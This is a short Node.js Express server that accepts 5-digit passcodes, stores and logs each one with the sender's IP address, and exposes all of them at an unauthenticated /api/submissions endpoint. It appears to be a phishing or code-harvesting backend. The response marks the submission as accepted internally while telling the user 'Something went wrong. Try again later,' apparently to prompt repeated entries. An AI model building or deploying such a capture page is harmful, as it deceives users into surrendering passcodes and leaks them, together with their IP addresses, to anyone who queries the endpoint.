const express = require('express');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// In-memory store of submitted passcodes (for demo purposes only)
const submissions = [];

app.post('/api/verify', (req, res) => {
  const { code } = req.body;

  // Basic validation: must be exactly 5 digits
  if (typeof code !== 'string' || !/^\d{5}$/.test(code)) {
    return res.status(400).json({ ok: false, message: 'Passcode must be exactly 5 digits.' });
  }

  const entry = {
    code,
    receivedAt: new Date().toISOString(),
    ip: req.ip,
  };
  submissions.push(entry);

  // This is where the input "is there" on the backend — logged and stored
  console.log('Received passcode submission:', entry);

  res.json({ ok: true, message: 'Something went wrong. Try again later.' });
});

// Simple endpoint to see everything the backend has received so far
app.get('/api/submissions', (req, res) => {
  res.json({ ok: true, count: submissions.length, submissions });
});

app.listen(PORT, () => {
  console.log(`Server running at http://localhost:${PORT}`);
});
